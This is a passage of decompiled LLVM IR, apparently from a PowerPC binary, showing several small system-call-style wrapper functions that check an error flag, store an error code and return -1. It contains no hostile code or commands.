dec_label_pc_1000bfd4:                            ; preds = %dec_label_pc_1000bfd4.lr.ph, %dec_label_pc_1000bfd4
  %v3_1000bfd4 = phi i32 [ 1, %dec_label_pc_1000bfd4.lr.ph ], [ %v1_1000bff8, %dec_label_pc_1000bfd4 ]
  %v1_1000bfd8 = mul i32 %v3_1000bfd4, 4
  %v1_1000bfe4 = add i32 %v1_1000bfd8, %v2_1000bfe0
  %v1_1000bfe8 = inttoptr i32 %v1_1000bfe4 to i32*
  %v2_1000bfe8 = load i32, i32* %v1_1000bfe8, align 4
  store i32 268484596, i32* @lr, align 4
  %v1_1000bff0 = call i32 @function_1000f0b8(i32 %v2_1000bfe8)
  %v3_1000bff4 = load i32, i32* %stack_var_-5320, align 4
  %v1_1000bff8 = add i32 %v3_1000bff4, 1
  store i32 %v1_1000bff8, i32* %stack_var_-5320, align 4
  %v2_1000c008 = icmp slt i32 %v1_1000bff8, %stack_var_-5308.1.lcssa
  br i1 %v2_1000c008, label %dec_label_pc_1000bfd4, label %dec_label_pc_1000c010

dec_label_pc_1000c010:                            ; preds = %dec_label_pc_1000bfd4, %dec_label_pc_1000bdc4, %dec_label_pc_1000bbbc, %dec_label_pc_1000bfa4, %dec_label_pc_1000bc1c, %dec_label_pc_1000bb70, %dec_label_pc_1000b7f4
  %v3_1000c014 = load i32, i32* @global_var_1002b8f8.42, align 4
  %v5_1000c028 = call i32 @function_10002564(i32 %v3_1000c014, i8* %v4_1000c028, i32 4096, i32 %v2_1000c018)
  %v4_1000c03c = icmp eq i32 %v5_1000c028, -1
  br i1 %v4_1000c03c, label %dec_label_pc_1000b7d8, label %dec_label_pc_1000bac0

; uselistorder directives
  uselistorder i32 %v5_1000c028, { 1, 0 }
  uselistorder i32 %v1_1000bff8, { 1, 2, 0 }
  uselistorder i32 %stack_var_-5308.1.lcssa, { 2, 1, 0 }
  uselistorder i32 %v3_1000bf8c, { 1, 0 }
  uselistorder i8* %stack_var_-5312.047, { 1, 0 }
  uselistorder i32 %stack_var_-5308.145, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge5, { 1, 0 }
  uselistorder i32 %v1_1000bd88, { 1, 0 }
  uselistorder i32 %storemerge1439, { 1, 0 }
  uselistorder i8* %storemerge540, { 1, 0 }
  uselistorder i32 %v1_1000bd48, { 1, 0 }
  uselistorder i8* %stack_var_-5284.023, { 3, 0, 4, 2, 1, 5 }
  uselistorder i32 %v1_1000bc64, { 5, 0, 2, 1, 3, 6, 7, 4 }
  uselistorder i32 %v1_1000bbdc, { 1, 0 }
  uselistorder i32 %v2_1000baec, { 1, 0 }
  uselistorder i32 %storemerge12, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32 %storemerge17, { 1, 0, 2 }
  uselistorder i32 %v1_1000b9f4, { 1, 0 }
  uselistorder i32 %v1_1000b9d8, { 1, 0 }
  uselistorder i32 %v3_1000b98c, { 1, 0 }
  uselistorder i32 %v1_1000b8a4, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1000bdd4, { 3, 1, 2, 4, 0, 5 }
  uselistorder i8* %v4_1000c028, { 1, 0 }
  uselistorder i32 %v2_1000c018, { 3, 1, 0, 4, 5, 6, 7, 8, 2 }
  uselistorder i32* %stack_var_-5320, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32, i32)* @function_1000e454, { 9, 8, 5, 4, 3, 2, 1, 0, 7, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_10018e58.698 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32)* @function_10001d64, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10001734, { 247, 246, 245, 244, 243, 242, 241, 240, 239, 238, 237, 236, 235, 234, 233, 232, 231, 230, 229, 228, 227, 226, 225, 224, 223, 222, 221, 220, 219, 218, 217, 216, 215, 214, 213, 212, 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23 }
  uselistorder i32 ()* @function_10002bfc, { 7, 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 (i32, i32)* @function_1000c83c, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_10000aec, { 1, 0 }
  uselistorder i32* @global_var_1002b900.50, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32 (i32, i32, i32)* @function_100017e4, { 7, 6, 1, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32)* @function_1000fdd8, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1000c7d4, { 2, 1, 0 }
  uselistorder i32 ()* @function_1000c384, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_1000f548, { 1, 0 }
  uselistorder i32 (i32)* @function_1000c78c, { 10, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i32 ()* @function_1000b5a0, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_1000c264, { 1, 0 }
  uselistorder label %dec_label_pc_1000c010, { 0, 3, 1, 4, 2, 5, 6 }
  uselistorder label %dec_label_pc_1000bfd4, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf80, { 1, 0 }
  uselistorder label %dec_label_pc_1000bebc, { 1, 0 }
  uselistorder label %dec_label_pc_1000be8c, { 1, 0 }
  uselistorder label %dec_label_pc_1000be5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd38, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000bd24, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc98, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbf4, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbbc, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bab4, { 1, 0 }
  uselistorder label %dec_label_pc_1000ba30, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9f0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b8f8, { 1, 0 }
  uselistorder label %dec_label_pc_1000b8b0, { 1, 0 }
  uselistorder label %dec_label_pc_1000b7d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000b7b8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000b69c, { 1, 0 }
}

define i32 @function_1000c048(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c048:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_1000c06c = icmp eq i32 %arg2, -2143521772
  %v2_1000c070 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c070, i32* %stack_var_-32, align 4
  br i1 %v4_1000c06c, label %dec_label_pc_1000c0cc, label %dec_label_pc_1000c08c

dec_label_pc_1000c08c:                            ; preds = %dec_label_pc_1000c048
  %v3_1000c08c = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_1000c08c, label %dec_label_pc_1000c0a4, label %dec_label_pc_1000c094

dec_label_pc_1000c094:                            ; preds = %dec_label_pc_1000c08c
  %v3_1000c098 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_1000c098, label %dec_label_pc_1000c0c0, label %dec_label_pc_1000c0ec

dec_label_pc_1000c0a4:                            ; preds = %dec_label_pc_1000c08c
  %v1_1000c0a4 = xor i32 %arg2, -2143551488
  %v3_1000c0a8 = icmp eq i32 %v1_1000c0a4, 29717
  br i1 %v3_1000c0a8, label %dec_label_pc_1000c0dc, label %dec_label_pc_1000c0b0

dec_label_pc_1000c0b0:                            ; preds = %dec_label_pc_1000c0a4
  %v3_1000c0b4 = icmp eq i32 %v1_1000c0a4, 29718
  br i1 %v3_1000c0b4, label %dec_label_pc_1000c0e4, label %dec_label_pc_1000c0ec

dec_label_pc_1000c0c0:                            ; preds = %dec_label_pc_1000c094
  store i32 ptrtoint (i32* @global_var_1000c0c8.699 to i32), i32* @lr, align 4
  %v1_1000c0c4 = inttoptr i32 %arg3 to i32*
  %v2_1000c0c4 = call i32 @function_1000e48c(i32* %v1_1000c0c4)
  br label %dec_label_pc_1000c0d4

dec_label_pc_1000c0cc:                            ; preds = %dec_label_pc_1000c048
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1000c0d0

dec_label_pc_1000c0d0:                            ; preds = %dec_label_pc_1000c0e4, %dec_label_pc_1000c0dc, %dec_label_pc_1000c0cc
  store i32 268484820, i32* @lr, align 4
  %v0_1000c0d0 = call i32 @function_1000e528()
  br label %dec_label_pc_1000c0d4

dec_label_pc_1000c0d4:                            ; preds = %dec_label_pc_1000c0c0, %dec_label_pc_1000c0d0
  %storemerge = phi i32 [ %v0_1000c0d0, %dec_label_pc_1000c0d0 ], [ %v2_1000c0c4, %dec_label_pc_1000c0c0 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c118

dec_label_pc_1000c0dc:                            ; preds = %dec_label_pc_1000c0a4
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1000c0d0

dec_label_pc_1000c0e4:                            ; preds = %dec_label_pc_1000c0b0
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_1000c0d0

dec_label_pc_1000c0ec:                            ; preds = %dec_label_pc_1000c0b0, %dec_label_pc_1000c094
  %v0_1000c0fc = call i32 @__asm_mfcr()
  %v1_1000c100 = and i32 %v0_1000c0fc, 268435456
  %v3_1000c100 = icmp eq i32 %v1_1000c100, 0
  store i32 %v0_1000c0fc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c100, label %dec_label_pc_1000c118, label %dec_label_pc_1000c10c

dec_label_pc_1000c10c:                            ; preds = %dec_label_pc_1000c0ec
  %v0_1000c10c = call i32 @function_1000c85c()
  %v0_1000c110 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c110 = inttoptr i32 %v0_1000c10c to i32*
  store i32 %v0_1000c110, i32* %v2_1000c110, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c118

dec_label_pc_1000c118:                            ; preds = %dec_label_pc_1000c0ec, %dec_label_pc_1000c0d4, %dec_label_pc_1000c10c
  %v0_1000c11c = phi i32 [ %v0_1000c0fc, %dec_label_pc_1000c0ec ], [ %storemerge, %dec_label_pc_1000c0d4 ], [ -1, %dec_label_pc_1000c10c ]
  ret i32 %v0_1000c11c

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000c118, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c0d4, { 1, 0 }
}

define i32 @function_1000c130() local_unnamed_addr {
dec_label_pc_1000c130:
  %v0_1000c138 = load i32, i32* @lr, align 4
  %v1_1000c138 = load i1, i1* @cr0_so, align 1
  %v2_1000c138 = xor i1 %v1_1000c138, true
  call void @__pseudo_cond_branch(i1 %v2_1000c138, i32 %v0_1000c138)
  %v0_1000c13c = call i32 @function_10010398()
  ret i32 %v0_1000c13c
}

define i32 @function_1000c140(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c140:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000c150 = add i32 %arg2, -12
  %v2_1000c158 = icmp ugt i32 %v1_1000c150, 2
  %v2_1000c15c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c15c, i32* %stack_var_-32, align 4
  br i1 %v2_1000c158, label %dec_label_pc_1000c18c, label %dec_label_pc_1000c17c

dec_label_pc_1000c17c:                            ; preds = %dec_label_pc_1000c140
  store i32 268484996, i32* @lr, align 4
  %v2_1000c180 = call i32 @function_1000c1c4(i32 3)
  store i32 %v2_1000c180, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c1ac

dec_label_pc_1000c18c:                            ; preds = %dec_label_pc_1000c140
  %v0_1000c190 = call i32 @__asm_mfcr()
  %v1_1000c194 = and i32 %v0_1000c190, 268435456
  %v3_1000c194 = icmp eq i32 %v1_1000c194, 0
  store i32 %v0_1000c190, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c194, label %dec_label_pc_1000c1ac, label %dec_label_pc_1000c1a0

dec_label_pc_1000c1a0:                            ; preds = %dec_label_pc_1000c18c
  %v0_1000c1a0 = call i32 @function_1000c85c()
  %v0_1000c1a4 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c1a4 = inttoptr i32 %v0_1000c1a0 to i32*
  store i32 %v0_1000c1a4, i32* %v2_1000c1a4, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c1ac

dec_label_pc_1000c1ac:                            ; preds = %dec_label_pc_1000c18c, %dec_label_pc_1000c17c, %dec_label_pc_1000c1a0
  %v0_1000c1b0 = phi i32 [ %v0_1000c190, %dec_label_pc_1000c18c ], [ %v2_1000c180, %dec_label_pc_1000c17c ], [ -1, %dec_label_pc_1000c1a0 ]
  ret i32 %v0_1000c1b0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c1ac, { 2, 0, 1 }
}

define i32 @function_1000c1c4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c1c4:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1000c1d8 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c1d8, i32* %stack_var_-32, align 4
  %v0_1000c1f8 = call i32 @__asm_mfcr()
  %v1_1000c1fc = and i32 %v0_1000c1f8, 268435456
  %v3_1000c1fc = icmp eq i32 %v1_1000c1fc, 0
  store i32 %v0_1000c1f8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c1fc, label %dec_label_pc_1000c214, label %dec_label_pc_1000c208

dec_label_pc_1000c208:                            ; preds = %dec_label_pc_1000c1c4
  %v0_1000c208 = call i32 @function_1000c85c()
  %v0_1000c20c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c20c = inttoptr i32 %v0_1000c208 to i32*
  store i32 %v0_1000c20c, i32* %v2_1000c20c, align 4
  br label %dec_label_pc_1000c214

dec_label_pc_1000c214:                            ; preds = %dec_label_pc_1000c1c4, %dec_label_pc_1000c208
  %v0_1000c224 = phi i32 [ %v0_1000c1f8, %dec_label_pc_1000c1c4 ], [ -1, %dec_label_pc_1000c208 ]
  ret i32 %v0_1000c224

; uselistorder directives
  uselistorder label %dec_label_pc_1000c214, { 1, 0 }
}

define i32 @function_1000c228(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c228:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_1000c23c

dec_label_pc_1000c23c:                            ; preds = %dec_label_pc_1000c23c.backedge, %dec_label_pc_1000c228
  %v0_1000c248 = call i32 @__asm_mfcr()
  %v1_1000c24c = and i32 %v0_1000c248, 268435456
  %v3_1000c24c = icmp eq i32 %v1_1000c24c, 0
  store i32 %v0_1000c248, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c24c, label %dec_label_pc_1000c23c.backedge, label %dec_label_pc_1000c258

dec_label_pc_1000c258:                            ; preds = %dec_label_pc_1000c23c
  %v0_1000c258 = call i32 @function_1000c85c()
  %v0_1000c25c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c25c = inttoptr i32 %v0_1000c258 to i32*
  store i32 %v0_1000c25c, i32* %v2_1000c25c, align 4
  br label %dec_label_pc_1000c23c.backedge

dec_label_pc_1000c23c.backedge:                   ; preds = %dec_label_pc_1000c258, %dec_label_pc_1000c23c
  br label %dec_label_pc_1000c23c
}

define i32 @function_1000c264(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c264:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c27c = call i32 @__asm_mfcr()
  %v1_1000c280 = and i32 %v0_1000c27c, 268435456
  %v3_1000c280 = icmp eq i32 %v1_1000c280, 0
  store i32 %v0_1000c27c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c280, label %dec_label_pc_1000c298, label %dec_label_pc_1000c28c

dec_label_pc_1000c28c:                            ; preds = %dec_label_pc_1000c264
  %v0_1000c28c = call i32 @function_1000c85c()
  %v0_1000c290 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c290 = inttoptr i32 %v0_1000c28c to i32*
  store i32 %v0_1000c290, i32* %v2_1000c290, align 4
  br label %dec_label_pc_1000c298

dec_label_pc_1000c298:                            ; preds = %dec_label_pc_1000c264, %dec_label_pc_1000c28c
  %v0_1000c2a8 = phi i32 [ %v0_1000c27c, %dec_label_pc_1000c264 ], [ -1, %dec_label_pc_1000c28c ]
  ret i32 %v0_1000c2a8

; uselistorder directives
  uselistorder label %dec_label_pc_1000c298, { 1, 0 }
}

define i32 @function_1000c2ac(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c2ac:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c2c4 = call i32 @__asm_mfcr()
  %v1_1000c2c8 = and i32 %v0_1000c2c4, 268435456
  %v3_1000c2c8 = icmp eq i32 %v1_1000c2c8, 0
  store i32 %v0_1000c2c4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c2c8, label %dec_label_pc_1000c2e0, label %dec_label_pc_1000c2d4

dec_label_pc_1000c2d4:                            ; preds = %dec_label_pc_1000c2ac
  %v0_1000c2d4 = call i32 @function_1000c85c()
  %v0_1000c2d8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c2d8 = inttoptr i32 %v0_1000c2d4 to i32*
  store i32 %v0_1000c2d8, i32* %v2_1000c2d8, align 4
  br label %dec_label_pc_1000c2e0

dec_label_pc_1000c2e0:                            ; preds = %dec_label_pc_1000c2ac, %dec_label_pc_1000c2d4
  %v0_1000c2f0 = phi i32 [ %v0_1000c2c4, %dec_label_pc_1000c2ac ], [ -1, %dec_label_pc_1000c2d4 ]
  ret i32 %v0_1000c2f0

; uselistorder directives
  uselistorder label %dec_label_pc_1000c2e0, { 1, 0 }
}

define i32 @function_1000c2f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c2f4:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c30c = call i32 @__asm_mfcr()
  %v1_1000c310 = and i32 %v0_1000c30c, 268435456
  %v3_1000c310 = icmp eq i32 %v1_1000c310, 0
  store i32 %v0_1000c30c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c310, label %dec_label_pc_1000c328, label %dec_label_pc_1000c31c

dec_label_pc_1000c31c:                            ; preds = %dec_label_pc_1000c2f4
  %v0_1000c31c = call i32 @function_1000c85c()
  %v0_1000c320 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c320 = inttoptr i32 %v0_1000c31c to i32*
  store i32 %v0_1000c320, i32* %v2_1000c320, align 4
  br label %dec_label_pc_1000c328

dec_label_pc_1000c328:                            ; preds = %dec_label_pc_1000c2f4, %dec_label_pc_1000c31c
  %v0_1000c338 = phi i32 [ %v0_1000c30c, %dec_label_pc_1000c2f4 ], [ -1, %dec_label_pc_1000c31c ]
  ret i32 %v0_1000c338

; uselistorder directives
  uselistorder label %dec_label_pc_1000c328, { 1, 0 }
}

define i32 @function_1000c33c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000c33c:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c354 = call i32 @__asm_mfcr()
  %v1_1000c358 = and i32 %v0_1000c354, 268435456
  %v3_1000c358 = icmp eq i32 %v1_1000c358, 0
  store i32 %v0_1000c354, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c358, label %dec_label_pc_1000c370, label %dec_label_pc_1000c364

dec_label_pc_1000c364:                            ; preds = %dec_label_pc_1000c33c
  %v0_1000c364 = call i32 @function_1000c85c()
  %v0_1000c368 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c368 = inttoptr i32 %v0_1000c364 to i32*
  store i32 %v0_1000c368, i32* %v2_1000c368, align 4
  br label %dec_label_pc_1000c370

dec_label_pc_1000c370:                            ; preds = %dec_label_pc_1000c33c, %dec_label_pc_1000c364
  %v0_1000c380 = phi i32 [ %v0_1000c354, %dec_label_pc_1000c33c ], [ -1, %dec_label_pc_1000c364 ]
  ret i32 %v0_1000c380

; uselistorder directives
  uselistorder label %dec_label_pc_1000c370, { 1, 0 }
}

define i32 @function_1000c384() local_unnamed_addr {
dec_label_pc_1000c384:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c39c = call i32 @__asm_mfcr()
  %v1_1000c3a0 = and i32 %v0_1000c39c, 268435456
  %v3_1000c3a0 = icmp eq i32 %v1_1000c3a0, 0
  store i32 %v0_1000c39c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c3a0, label %dec_label_pc_1000c3b8, label %dec_label_pc_1000c3ac

dec_label_pc_1000c3ac:                            ; preds = %dec_label_pc_1000c384
  %v0_1000c3ac = call i32 @function_1000c85c()
  %v0_1000c3b0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c3b0 = inttoptr i32 %v0_1000c3ac to i32*
  store i32 %v0_1000c3b0, i32* %v2_1000c3b0, align 4
  br label %dec_label_pc_1000c3b8

dec_label_pc_1000c3b8:                            ; preds = %dec_label_pc_1000c384, %dec_label_pc_1000c3ac
  %v0_1000c3c8 = phi i32 [ %v0_1000c39c, %dec_label_pc_1000c384 ], [ -1, %dec_label_pc_1000c3ac ]
  ret i32 %v0_1000c3c8

; uselistorder directives
  uselistorder label %dec_label_pc_1000c3b8, { 1, 0 }
}

define i32 @function_1000c3cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000c3cc:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000c3d8 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268485604, i32* @lr, align 4
  %v2_1000c3e0 = call i32 @function_1000c494(i32 7, i32 %v2_1000c3d8)
  %v1_1000c3e4 = icmp slt i32 %v2_1000c3e0, 0
  br i1 %v1_1000c3e4, label %dec_label_pc_1000c3f4, label %dec_label_pc_1000c3f0

dec_label_pc_1000c3f0:                            ; preds = %dec_label_pc_1000c3cc
  %v3_1000c3f0 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000c3f4

dec_label_pc_1000c3f4:                            ; preds = %dec_label_pc_1000c3cc, %dec_label_pc_1000c3f0
  %v0_1000c400 = phi i32 [ 256, %dec_label_pc_1000c3cc ], [ %v3_1000c3f0, %dec_label_pc_1000c3f0 ]
  ret i32 %v0_1000c400

; uselistorder directives
  uselistorder label %dec_label_pc_1000c3f4, { 1, 0 }
}

define i32 @function_1000c404() local_unnamed_addr {
dec_label_pc_1000c404:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c41c = call i32 @__asm_mfcr()
  %v1_1000c420 = and i32 %v0_1000c41c, 268435456
  %v3_1000c420 = icmp eq i32 %v1_1000c420, 0
  store i32 %v0_1000c41c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c420, label %dec_label_pc_1000c438, label %dec_label_pc_1000c42c

dec_label_pc_1000c42c:                            ; preds = %dec_label_pc_1000c404
  %v0_1000c42c = call i32 @function_1000c85c()
  %v0_1000c430 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c430 = inttoptr i32 %v0_1000c42c to i32*
  store i32 %v0_1000c430, i32* %v2_1000c430, align 4
  br label %dec_label_pc_1000c438

dec_label_pc_1000c438:                            ; preds = %dec_label_pc_1000c404, %dec_label_pc_1000c42c
  %v0_1000c448 = phi i32 [ %v0_1000c41c, %dec_label_pc_1000c404 ], [ -1, %dec_label_pc_1000c42c ]
  ret i32 %v0_1000c448

; uselistorder directives
  uselistorder label %dec_label_pc_1000c438, { 1, 0 }
}

define i32 @function_1000c44c() local_unnamed_addr {
dec_label_pc_1000c44c:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c464 = call i32 @__asm_mfcr()
  %v1_1000c468 = and i32 %v0_1000c464, 268435456
  %v3_1000c468 = icmp eq i32 %v1_1000c468, 0
  store i32 %v0_1000c464, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c468, label %dec_label_pc_1000c480, label %dec_label_pc_1000c474

dec_label_pc_1000c474:                            ; preds = %dec_label_pc_1000c44c
  %v0_1000c474 = call i32 @function_1000c85c()
  %v0_1000c478 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c478 = inttoptr i32 %v0_1000c474 to i32*
  store i32 %v0_1000c478, i32* %v2_1000c478, align 4
  br label %dec_label_pc_1000c480

dec_label_pc_1000c480:                            ; preds = %dec_label_pc_1000c44c, %dec_label_pc_1000c474
  %v0_1000c490 = phi i32 [ %v0_1000c464, %dec_label_pc_1000c44c ], [ -1, %dec_label_pc_1000c474 ]
  ret i32 %v0_1000c490

; uselistorder directives
  uselistorder label %dec_label_pc_1000c480, { 1, 0 }
}

define i32 @function_1000c494(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c494:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c4ac = call i32 @__asm_mfcr()
  %v1_1000c4b0 = and i32 %v0_1000c4ac, 268435456
  %v3_1000c4b0 = icmp eq i32 %v1_1000c4b0, 0
  store i32 %v0_1000c4ac, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c4b0, label %dec_label_pc_1000c4c8, label %dec_label_pc_1000c4bc

dec_label_pc_1000c4bc:                            ; preds = %dec_label_pc_1000c494
  %v0_1000c4bc = call i32 @function_1000c85c()
  %v0_1000c4c0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c4c0 = inttoptr i32 %v0_1000c4bc to i32*
  store i32 %v0_1000c4c0, i32* %v2_1000c4c0, align 4
  br label %dec_label_pc_1000c4c8

dec_label_pc_1000c4c8:                            ; preds = %dec_label_pc_1000c494, %dec_label_pc_1000c4bc
  %v0_1000c4d8 = phi i32 [ %v0_1000c4ac, %dec_label_pc_1000c494 ], [ -1, %dec_label_pc_1000c4bc ]
  ret i32 %v0_1000c4d8

; uselistorder directives
  uselistorder label %dec_label_pc_1000c4c8, { 1, 0 }
}

define i32 @function_1000c4dc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c4dc:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c4f4 = call i32 @__asm_mfcr()
  %v1_1000c4f8 = and i32 %v0_1000c4f4, 268435456
  %v3_1000c4f8 = icmp eq i32 %v1_1000c4f8, 0
  store i32 %v0_1000c4f4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c4f8, label %dec_label_pc_1000c510, label %dec_label_pc_1000c504

dec_label_pc_1000c504:                            ; preds = %dec_label_pc_1000c4dc
  %v0_1000c504 = call i32 @function_1000c85c()
  %v0_1000c508 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c508 = inttoptr i32 %v0_1000c504 to i32*
  store i32 %v0_1000c508, i32* %v2_1000c508, align 4
  br label %dec_label_pc_1000c510

dec_label_pc_1000c510:                            ; preds = %dec_label_pc_1000c4dc, %dec_label_pc_1000c504
  %v0_1000c520 = phi i32 [ %v0_1000c4f4, %dec_label_pc_1000c4dc ], [ -1, %dec_label_pc_1000c504 ]
  ret i32 %v0_1000c520

; uselistorder directives
  uselistorder label %dec_label_pc_1000c510, { 1, 0 }
}

define i32 @function_1000c524(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000c524:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000c534 = and i32 %arg2, 64
  %v3_1000c534 = icmp eq i32 %v1_1000c534, 0
  br i1 %v3_1000c534, label %dec_label_pc_1000c564, label %dec_label_pc_1000c548

dec_label_pc_1000c548:                            ; preds = %dec_label_pc_1000c524
  %v2_1000c550 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c550, i32* %stack_var_-32, align 4
  %v0_1000c560 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000c564

dec_label_pc_1000c564:                            ; preds = %dec_label_pc_1000c524, %dec_label_pc_1000c548
  %v0_1000c564 = phi i32 [ 0, %dec_label_pc_1000c524 ], [ %v0_1000c560, %dec_label_pc_1000c548 ]
  store i32 %v0_1000c564, i32* @r5, align 4
  %v0_1000c56c = call i32 @__asm_mfcr()
  %v1_1000c570 = and i32 %v0_1000c56c, 268435456
  %v3_1000c570 = icmp eq i32 %v1_1000c570, 0
  store i32 %v0_1000c56c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c570, label %dec_label_pc_1000c588, label %dec_label_pc_1000c57c

dec_label_pc_1000c57c:                            ; preds = %dec_label_pc_1000c564
  %v0_1000c57c = call i32 @function_1000c85c()
